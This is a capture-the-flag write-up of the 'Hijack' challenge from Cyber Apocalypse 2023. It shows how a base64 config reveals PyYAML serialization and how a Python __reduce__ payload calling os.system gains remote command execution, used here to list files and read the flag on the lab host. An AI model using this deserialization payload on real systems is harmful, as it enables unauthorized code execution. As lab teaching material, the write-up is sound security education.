# Hijack

## Overview

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. Can you take advantage of the situation without raising any suspicion?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319173707.png)

## Find the flag

**In this challenge, we can `nc` to the instance machine:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Hijack)-[2023.03.19|17:37:31(HKT)]
└> nc 159.65.81.51 31087

<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 
```

In here, we can "Create config" and "Load config".

**Create config:**
```shell
<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 1

- Creating new config -
Temperature units (F/C/K): F
Propulsion Components Target Temperature : 69
Solar Array Target Temperature : 96
Infrared Spectrometers Target Temperature : 420
Auto Calibration (ON/OFF) : ON  

Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICc0MjAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzY5Jywgc29sYXJfYXJyYXlfdGVtcDogJzk2JywgdW5pdHM6IEZ9Cg==
Uploading to ship...


<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 
```

Based on my experience, the last 2 characters are `=`, which is a base64 encoded string.

Also, the output said: "***Serialized*** config"

**Let's try to base64 decode that:**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Hijack)-[2023.03.19|17:36:21(HKT)]
└> echo 'ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICc0MjAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzY5Jywgc29sYXJfYXJyYXlfdGVtcDogJzk2JywgdW5pdHM6IEZ9Cg==' | base64 -d
!!python/object:__main__.Config {IR_spectrometer_temp: '420', auto_calibration: 'ON', propulsion_temp: '69', solar_array_temp: '96', units: F}
```

Again, based on my experience, the decoded string is a ***Python's YAML library's serialized data***.

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization#rce), we can gain RCE (Remote Code Execution) on the instance machine!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230319174054.png)

**With that said, let's copy and paste that payload, and generate a base64 encoded serialized YAML data:**
```py
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import os
import base64

class Payload(object):
    def __reduce__(self):
        return (os.system,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(base64.b64encode(deserialized_data.encode('utf-8')).decode())
```

```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Hijack)-[2023.03.19|17:45:27(HKT)]
└> python3 solve.py
ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGxzCg==
```

When the YAML data is deserialized, the instance machine will try to run class `Payload`, and **the magic method `__reduce__` will be automatically invoked**, which will then executing OS command.

**Let's load that config!**
```shell
<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 2

Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGxzCg==
chall.py
flag.txt
hijack.py
** Success **
Uploading to ship...
```

Boom! We can confirm **it's vulnerable to Python's YAML insecure deserialization**.

**Let's read the flag!**

**Payload:**
```py
return (os.system,('cat flag.txt',))
```

```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Misc/Hijack)-[2023.03.19|17:50:00(HKT)]
└> python3 solve.py
ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGNhdCBmbGFnLnR4dAo=
```

```shell
<------[TCS]------>
[1] Create config
[2] Load config
[3] Exit
> 2

Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnBvc2l4LnN5c3RlbQotIGNhdCBmbGFnLnR4dAo=
HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
** Success **
Uploading to ship...
```

- **Flag: `HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}`**

## Conclusion

What we've learned:

1. Insecure Deserialization In Python's YAML Library